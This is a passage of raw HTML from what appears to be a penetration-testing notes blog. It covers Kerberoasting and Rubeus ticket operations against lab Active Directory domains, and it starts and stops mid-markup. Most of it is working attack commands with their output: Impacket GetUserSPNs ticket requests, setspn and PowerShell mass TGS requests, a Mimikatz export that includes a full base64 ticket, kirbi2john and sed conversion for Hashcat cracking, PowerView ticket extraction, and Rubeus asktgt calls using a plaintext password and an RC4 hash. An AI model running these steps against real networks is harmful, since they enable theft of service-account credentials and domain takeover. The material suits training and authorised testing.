alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&amp;ssl=1\"></p>\n<h3 id=\"Type-of-SPN\"><a href=\"#Type-of-SPN\" class=\"headerlink\" title=\"Type of SPN\"></a>Type of SPN</h3><ul>\n<li>Host-based SPNs which is associated with the computer account in AD, it is randomly generated 128-character long password which is changed every 30 days; hence it is no use in Kerberoasting attacks</li>\n<li>SPNs that have been associated with a domain user account where NTLM hash will be used.</li>\n</ul>\n<h3 id=\"Linux-Perspective\"><a href=\"#Linux-Perspective\" class=\"headerlink\" title=\"Linux Perspective\"></a>Linux Perspective</h3><h4 id=\"Attack-Procedure\"><a href=\"#Attack-Procedure\" class=\"headerlink\" title=\"Attack Procedure.\"></a>Attack Procedure.</h4><p>Depending on your positioning a network, Kerberos attacks can be performed in multiple ways.</p>\n<ul>\n<li>From a non-domain joined Linux host using valid domain user credentials.</li>\n<li>From a domain-joined Linux host as root after retrieving the keytab file.</li>\n<li>From a domain-joined Windows, the host is authenticated as a domain user.</li>\n<li>From a domain-joined Windows host with a shell in the context of a domain account.</li>\n<li>As SYSTEM on a domain-joined Windows host.</li>\n<li>From a non-domain joined Windows host using <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)\">runas</a> &#x2F;netonly.</li>\n</ul>\n<h4 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools.\"></a>Tools.</h4><p>Some tools can be utilized to perform the attack.</p>\n<ul>\n<li>Impacket’s <a href=\"https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py\">GetUserSPNs.py</a> from a non-domain joined Linux host.</li>\n<li>A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.</li>\n<li>From Windows, utilizing tools such as PowerView, <a href=\"https://github.com/GhostPack/Rubeus\">Rubeus</a>, and other PowerShell scripts.</li>\n</ul>\n<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>REMEMBER!!!</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>\n<p>Obtaining a TGS ticket via kerberoasting does not guarantee a set of valid credentials and the ticket still must be cracked offline to obtain the cleartext password.</p>\n<p>TGS tickets generally take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using s standard cracking rig.</p>\n<h4 id=\"The-efficiency-of-Attack\"><a href=\"#The-efficiency-of-Attack\" class=\"headerlink\" title=\"The efficiency of Attack\"></a>The efficiency of Attack</h4><p>While it can be a great way to move lateral or escalate privileges in a domain kerberoasting and the presence of SPNs does not guarantee us any level of access.</p>\n<p>We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.</p>\n<p><strong>N&#x2F;B -</strong> When writing a report this finding is termed as high-risk in the first two cases. Third case we may Kerberos and end up unable to crack a single TGS ticket even after mad days of cracking attempts with Hashcat. This would be dropped as a medium-risk issue to make the client aware of the risk of SPNs in the domain.</p>\n<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>REMEMBER!!!</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>\n<p>A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.</p>\n<h4 id=\"GetUserSPNs-py\"><a href=\"#GetUserSPNs-py\" class=\"headerlink\" title=\"GetUserSPNs.py\"></a>GetUserSPNs.py</h4><p><strong>Listing SPN Accounts.</strong></p>\n<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend</code></p>\n<h4 id=\"Requesting-all-TGS-tickets\"><a href=\"#Requesting-all-TGS-tickets\" class=\"headerlink\" title=\"Requesting all TGS tickets.**\"></a>Requesting all TGS tickets.**</h4><p>Later on, we can pull all TGS tickets for offline processing using the <strong>-request</strong> flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or Johnny for offline password-cracking attempts.</p>\n<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request</code></p>\n<h4 id=\"Requesting-a-Single-TGS-Ticket\"><a href=\"#Requesting-a-Single-TGS-Ticket\" class=\"headerlink\" title=\"Requesting a Single TGS Ticket.\"></a>Requesting a Single TGS Ticket.</h4><p>Wte can also be more targeted and request just the TGS ticket for a specific account. Let’s try requesting one for just the required account.</p>\n<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user</code></p>\n<p>With this ticket in hand, we could attempt, to crack the password offline, if successful we may end up with Domain Admin Rights.</p>\n<p>Saving the Ticket o facilitate offline cracking, it is always good to use the <code>-outputfile</code> flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.</p>\n<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs</code></p>\n<h3 id=\"Windows-Perspective\"><a href=\"#Windows-Perspective\" class=\"headerlink\" title=\"Windows Perspective\"></a>Windows Perspective</h3><p>Kerberoasting - Semi-Manual Method.</p>\n<h4 id=\"Enumerating-SPNs-with-setspn-exe\"><a href=\"#Enumerating-SPNs-with-setspn-exe\" class=\"headerlink\" title=\"Enumerating SPNs with setspn.exe\"></a>Enumerating SPNs with setspn.exe</h4><p><code>setspn.exe -Q */*</code> running the command you’ll notice many different SPNs returned for the various hosts in the domain.</p>\n<h4 id=\"Retrieving-All-Tickets-using-setspn-exe\"><a href=\"#Retrieving-All-Tickets-using-setspn-exe\" class=\"headerlink\" title=\"Retrieving All Tickets using setspn.exe\"></a>Retrieving All Tickets using setspn.exe</h4><p><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;</code></p>\n<p>The above command combines the previous command with <code>setspn.exe</code> to request tickets for all accounts with SPNs set.</p>\n<p>Using <strong><strong><strong><strong><strong><strong><strong><strong><strong>Powershell</strong></strong></strong></strong></strong></strong></strong></strong></strong> we can request TGS tickets for an account in the shell and load them into memory, once they are loaded into memory we can extract them using <strong>Mimkatz.</strong></p>\n<h4 id=\"Targeting-a-Single-User\"><a href=\"#Targeting-a-Single-User\" class=\"headerlink\" title=\"Targeting a Single User**************\"></a>Targeting a Single User**************</h4><figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">PS</span> C:\\htb&gt; <span class=\"built_in\">Add-Type</span> <span class=\"literal\">-AssemblyName</span> System.IdentityModel</span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\htb&gt; <span class=\"built_in\">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class=\"literal\">-ArgumentList</span> <span class=\"string\">&quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</span></span><br></pre></td></tr></table></figure>\n<p>Before moving on, let’s break down the commands above to see what we are doing (which is essentially what is used by <a href=\"https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1\">Rubeus</a> when using the default Kerberoasting method):</p>\n<ul>\n<li>The <a href=\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2\">Add-Type</a> cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object</li>\n<li>The <code>AssemblyName</code> parameter allows us to specify an assembly that contains types that we are interested in using</li>\n<li><a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8\">System.IdentityModel</a> is a namespace that contains different classes for building security token services</li>\n<li>We’ll then use the <a href=\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2\">New-Object</a> cmdlet to create an instance of a .NET Framework object</li>\n<li>We’ll use the <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8\">System.IdentityModel.Tokens</a> namespace with the <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8\">KerberosRequestorSecurityToken</a> class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session</li>\n</ul>\n<p>We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.</p>\n<p>Now that the tickets are loaded, we can use <code>Mimikatz</code> to extract the ticket(s) from <code>memory</code>.</p>\n<h3 id=\"Extracting-Tickets-from-Memory-with-Mimikatz\"><a href=\"#Extracting-Tickets-from-Memory-with-Mimikatz\" class=\"headerlink\" title=\"Extracting Tickets from Memory with Mimikatz\"></a>Extracting Tickets from Memory with Mimikatz</h3><figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">Using</span> <span class=\"string\">&#x27;mimikatz.log&#x27;</span> for logfile : OK</span><br><span class=\"line\"></span><br><span class=\"line\">mimikatz <span class=\"comment\"># base64 /out:true</span></span><br><span class=\"line\">isBase64InterceptInput  is false</span><br><span class=\"line\">isBase64InterceptOutput is true</span><br><span class=\"line\"></span><br><span class=\"line\">mimikatz <span class=\"comment\"># kerberos::list /export</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;SNIP&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">00000002</span>] - <span class=\"number\">0</span>x00000017 - rc4_hmac_nt</span><br><span class=\"line\">   <span class=\"built_in\">Start</span>/<span class=\"keyword\">End</span>/MaxRenew: <span class=\"number\">2</span>/<span class=\"number\">24</span>/<span class=\"number\">2022</span> <span class=\"number\">3</span>:<span class=\"number\">36</span>:<span class=\"number\">22</span> PM ; <span class=\"number\">2</span>/<span class=\"number\">25</span>/<span class=\"number\">2022</span> <span class=\"number\">12</span>:<span class=\"number\">55</span>:<span class=\"number\">25</span> AM ; <span class=\"number\">3</span>/<span class=\"number\">3</span>/<span class=\"number\">2022</span> <span class=\"number\">2</span>:<span class=\"number\">55</span>:<span class=\"number\">25</span> PM</span><br><span class=\"line\">   Server Name: MSSQLSvc/DEV<span class=\"literal\">-PRE-SQL</span>.inlanefreight.local:<span class=\"number\">1433</span> <span class=\"selector-tag\">@</span> INLANEFREIGHT.LOCAL</span><br><span class=\"line\">   Client Name: htb<span class=\"literal\">-student</span> <span class=\"selector-tag\">@</span> INLANEFREIGHT.LOCAL</span><br><span class=\"line\">   Flags <span class=\"number\">40</span>a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;</span><br><span class=\"line\">====================</span><br><span class=\"line\">Base64 of file : <span class=\"number\">2</span><span class=\"literal\">-40a10000-htb-student</span>@MSSQLSvc~DEV<span class=\"literal\">-PRE-SQL</span>.inlanefreight.local~<span class=\"number\">1433</span><span class=\"literal\">-INLANEFREIGHT</span>.LOCAL.kirbi</span><br><span class=\"line\">====================</span><br><span class=\"line\">doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO</span><br><span class=\"line\">RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T</span><br><span class=\"line\">UUwuaW5sYW5lZnJlaWdodC5sb2NhbDoxNDMzo4IEvzCCBLugAwIBF6EDAgECooIE</span><br><span class=\"line\">rQSCBKmBMUn7JhVJpqG0ll7UnRuoeoyRtHxTS8JY1cl6z0M4QbLvJHi0JYZdx1w5</span><br><span class=\"line\">sdzn9Q3tzCn8ipeu+NUaIsVyDuYU/LZG4o2FS83CyLNiu/r2Lc2ZM8Ve/rqdd+TG</span><br><span class=\"line\">xvUkr+<span class=\"number\">5</span>caNrPy2YHKRogzfsO8UQFU1anKW4ztEB1S+f4d1SsLkhYNI4q67cnCy00</span><br><span class=\"line\">UEf4gOF6zAfieo91LDcryDpi1UII0SKIiT0yr9IQGR3TssVnl70acuNac6eCC+Uf</span><br><span class=\"line\">vyd7g9gYH/<span class=\"number\">9</span>aBc8hSBp7RizrAcN2HFCVJontEJmCfBfCk0Ex23G8UULFic1w7S6/</span><br><span class=\"line\">V9yj9iJvOyGElSk1VBRDMhC41712/sTraKRd7rw+fMkx7YdpMoU2dpEj9QQNZ3GR</span><br><span class=\"line\">XNvGyQFkZp+sctI6Yx/vJYBLXI7DloCkzClZkp7c40u+<span class=\"number\">5</span>q/xNby7smpBpLToi5No</span><br><span class=\"line\">ltRmKshJ9W19aAcb4TnPTfr2ZJcBUpf5tEza7wlsjQAlXsPmL3EF2QXQsvOc74Pb</span><br><span class=\"line\">TYEnGPlejJkSnzIHs4a0wy99V779QR4ZwhgUjRkCjrAQPWvpmuI6RU9vOwM50A0n</span><br><span class=\"line\">h580JZiTdZbK2tBorD2BWVKgU/h9h7JYR4S52DBQ7qmnxkdM3ibJD0o1RgdqQO03</span><br><span class=\"line\">TQBMRl9lRiNJnKFOnBFTgBLPAN7jFeLtREKTgiUC1/aFAi5h81aOHbJbXP5aibM4</span><br><span class=\"line\">eLbj2wXp2RrWOCD8t9BEnmat0T8e/O3dqVM52z3JGfHK/<span class=\"number\">5</span>aQ5Us+T5qM9pmKn5v1</span><br><span class=\"line\">XHou0shzgunaYPfKPCLgjMNZ8+<span class=\"number\">9</span>vRgOlry/CgwO/NgKrm8UgJuWMJ/skf9QhD0Uk</span><br><span class=\"line\">T9cUhGhbg3/pVzpTlk1UrP3n+WMCh2Tpm+p7dxOctlEyjoYuQ9iUY4KI6s6ZttT4</span><br><span class=\"line\">tmhBUNua3EMlQUO3fzLr5vvjCd3jt4MF/fD+YFBfkAC4nGfHXvbdQl4E++Ol6/LX</span><br><span class=\"line\">ihGjktgVop70jZRX+<span class=\"number\">2</span>x4DrTMB9+mjC6XBUeIlS9a2Syo0GLkpolnhgMC/ZYwF0r4</span><br><span class=\"line\">MuWZu1/KnPNB16EXaGjZBzeW3/vUjv6ZsiL0J06TBm3mRrPGDR3ZQHLdEh3QcGAk</span><br><span class=\"line\"><span class=\"number\">0</span>Rc4p16+tbeGWlUFIg0PA66m01mhfzxbZCSYmzG25S0cVYOTqjToEgT7EHN0qIhN</span><br><span class=\"line\">yxb2xZp2oAIgBP2SFzS4cZ6GlLoNf4frRvVgevTrHGgba1FA28lKnqf122rkxx+<span class=\"number\">8</span></span><br><span class=\"line\">ECSiW3esAL3FSdZjc9OQZDvo8QB5MKQSTpnU/LYXfb1WafsGFw07inXbmSgWS1Xk</span><br><span class=\"line\">VNCOd/kXsd0uZI2cfrDLK4yg7/ikTR6l/dZ+Adp5BHpKFAb3YfXjtpRM6+<span class=\"number\">1</span>FN56<span class=\"built_in\">h</span></span><br><span class=\"line\">TnoCfIQ/pAXAfIOFohAvB5Z6fLSIP0TuctSqejiycB53N0AWoBGT9bF4409M8tjq</span><br><span class=\"line\"><span class=\"number\">32</span>UeFiVp60IcdOjV4Mwan6tYpLm2O6uwnvw0J+Fmf5x3Mbyr42RZhgQKcwaSTfXm</span><br><span class=\"line\"><span class=\"number\">5</span>oZV57Di6I584CgeD1VN6C2d5sTZyNKjb85lu7M3pBUDDOHQPAD9l4Ovtd8O6Pur</span><br><span class=\"line\">+jWFIa2EXm0<span class=\"built_in\">H</span>/efTTyMR665uahGdYNiZRnpm+ZfCc9LfczUPLWxUOOcaBX/uq6OC</span><br><span class=\"line\">AQEwgf6gAwIBAKKB9gSB832B8DCB7aCB6jCB5zCB5KAbMBmgAwIBF6ESBBB3DAVi</span><br><span class=\"line\">Ys6KmIFpubCAqyQcoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiGDAWoAMCAQGhDzAN</span><br><span class=\"line\">GwtodGItc3R1ZGVudKMHAwUAQKEAAKURGA8yMDIyMDIyNDIzMzYyMlqmERgPMjAy</span><br><span class=\"line\">MjAyMjUwODU1MjVapxEYDzIwMjIwMzAzMjI1NTI1WqgVGxNJTkxBTkVGUkVJR0hU</span><br><span class=\"line\">LkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFu</span><br><span class=\"line\">ZWZyZWlnaHQubG9jYWw6MTQzMw==</span><br><span class=\"line\">====================</span><br><span class=\"line\"></span><br><span class=\"line\">   * Saved to file     : <span class=\"number\">2</span><span class=\"literal\">-40a10000-htb-student</span>@MSSQLSvc~DEV<span class=\"literal\">-PRE-SQL</span>.inlanefreight.local~<span class=\"number\">1433</span><span class=\"literal\">-INLANEFREIGHT</span>.LOCAL.kirbi</span><br></pre></td></tr></table></figure>\n<p>If we don’t specify the <strong>base64 &#x2F;out:true</strong> command, Mimikatz will extract the tickets and write the to <strong>.kirbi</strong> files. </p>\n<p> Next, you prepare the base blob for cracking <code>echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\\\n</code> then place the above into a file and convert it back to a <strong>.kirbi</strong> file using the base64 utility.<code>cat encoded_file | base64 -d &gt; sqldev.kirbi</code></p>\n<p> Extract the kerberos ticket using <a href=\"http://kirbi2john.py/\">kirbi2john.py</a> this will create a file called <strong>crack_file,</strong> which then must be modified to be able to use Hashcat against the hash <code>python2.7 kirbi2john.py sqldev.kirbi</code></p>\n<p>Modifying the crack file for hashcat <code>sed &#39;s/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/&#39; crack_file &gt; sqldev_tgs_hashcat</code> now you can run the ticket through hashcat and get a clear password.</p>\n<h4 id=\"Skipped-Version\"><a href=\"#Skipped-Version\" class=\"headerlink\" title=\"Skipped Version\"></a>Skipped Version</h4><p>So if we decide to skip the base64 output with mimkatz and type <strong>mimikatz # kerberos::list &#x2F;export,</strong> the <strong>.kirbi</strong> file will be written to disk, in this case, you can download the file and run <strong><a href=\"http://kirbi2john.py/\">kirbi2john.py</a></strong> against them directly, skipping the base64 decoding step.</p>\n<h4 id=\"AUTOMATE-VERSION\"><a href=\"#AUTOMATE-VERSION\" class=\"headerlink\" title=\"AUTOMATE VERSION\"></a>AUTOMATE VERSION</h4><p>Using <a href=\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1\">PowerView</a> to extract the TGS ticket and convert them to Hashcat format.</p>\n<p><strong>Extracting TGS Ticket</strong></p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">PS</span> C:\\htb&gt; <span class=\"built_in\">Import-Module</span> .\\PowerView.ps1</span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\htb&gt; <span class=\"built_in\">Get-DomainUser</span> * <span class=\"literal\">-spn</span> | <span class=\"built_in\">select</span> samaccountname</span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\htb&gt; <span class=\"built_in\">Get-DomainUser</span> <span class=\"literal\">-Identity</span> sqldev | <span class=\"built_in\">Get-DomainSPNTicket</span> <span class=\"literal\">-Format</span> Hashcat</span><br></pre></td></tr></table></figure>\n<p><strong>Target Specific User</strong></p>\n<p><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</code></p>\n<p><strong>Exporting All Tickets to a CSV file and viewing the Content</strong></p>\n<p><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation</code></p>\n<p><code>cat .\\ilfreight_tgs.csv</code></p>\n<h2 id=\"REBEUS\"><a href=\"#REBEUS\" class=\"headerlink\" title=\"REBEUS\"></a>REBEUS</h2><p><a href=\"https://github.com/GhostPack/Rubeus\">https://github.com/GhostPack/Rubeus</a></p>\n<p>A tool capable of performing kerberoasting faster and easier by providing a variety of options to interact with kerberos</p>\n<p><a href=\"https://www.hackingarticles.in/a-detailed-guide-on-rubeus/\">https://www.hackingarticles.in/a-detailed-guide-on-rubeus/</a></p>\n<h3 id=\"Ticket-Operations\"><a href=\"#Ticket-Operations\" class=\"headerlink\" title=\"Ticket Operations\"></a><strong>Ticket Operations</strong></h3><p>Working in an Active Directory environment depends on various tickets. For example, a Ticket Granting Ticket is an authentication token issued by the KDC which is used to request access from TGS for specific resources.</p>\n<p>In this section, we’ll talk about Rubeus and its capability to play around with tickets.</p>\n<h4 id=\"Asktgt\"><a href=\"#Asktgt\" class=\"headerlink\" title=\"Asktgt\"></a>Asktgt</h4><p>Rubeus can generate raw AS-REQ traffic in order to ask for a TGT with a provided username and password. The password can also be encrypted in RC4, AES or DES encryption and it would still work. Let’s see an example where a clear-text password is supplied</p>\n<p><code>rubeus.exe asktgt /user:harshitrajpal /password: Password@1</code></p>\n<p> <img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&amp;ssl=1\"></p>\n<p>As you can see above that a KRBTGT has been successfully generated which can be further used to generate TGS. The same can be achieved by providing an encrypted password. Let’s use a password encrypted with the RC4 cipher.</p>\n<p><code>rubeus.exe asktgt /user:harshitrajpal /rc4:64FBAE31CC352FC26AF97CBDEF151E03</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&amp;ssl=1\"></p>\n<p><strong>Asktgs</strong></p>\n<p>Rubeus has an asktgs option which can build raw TGS-REP requests by providing a ticket either in the CLI argument or by providing a path to a ticket.kirbi file placed on disk. Each TGS has a specified purpose.</p>\n<p>For example, let’s create a TGS for the LDAP service. One or more service SPNs can be provided.</p>\n<p><code>rubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local</code><br><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&amp;ssl=1\"></p>\n<p>By providing in the TGT we generated in the previous step (copying in notepad and removing enters to type the ticket in a single line) we have generated a TGS successfully.</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&amp;ssl=1\"></p>\n<h3 id=\"Klist\"><a href=\"#Klist\" class=\"headerlink\" title=\"Klist\"></a>Klist</h3><p>Klist command in Windows can be used to view the tickets generated in the system. Here, when we run klist command we can see that a KRBTGT and an LDAP TGS have been generated and stored in the session.</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&amp;ssl=1\"></p>\n<h3 id=\"Renew\"><a href=\"#Renew\" class=\"headerlink\" title=\"Renew\"></a>Renew</h3><p>The renew function in Rubeus builds a TGT renewal exchange. We can specify a domain controller using the &#x2F;dc flag which will be used as a destination for the renewal traffic. We can further use the <strong>tgtdeleg</strong> option with this and extract user’s credentials without elevation and keep it alive on another system for a week by default.</p>\n<p><strong>&#x2F;ptt</strong> flag can also be used in conjunction to apply the Kerberos</p>\n<p><code>rubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&amp;ssl=1\"></p>\n<p><strong>&#x2F;autorenew</strong> sub-function will put the exchange to sleep for endTime 30 minutes and after that window automatically renew the TGT and display the renewed ticket</p>\n<p><code>rubeus.exe renew /dc:dc1.ignite.local /autorenew /ticket:doIFNDCCBTCgAw...bA==</code></p>\n<p> <img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&ssl=1\" 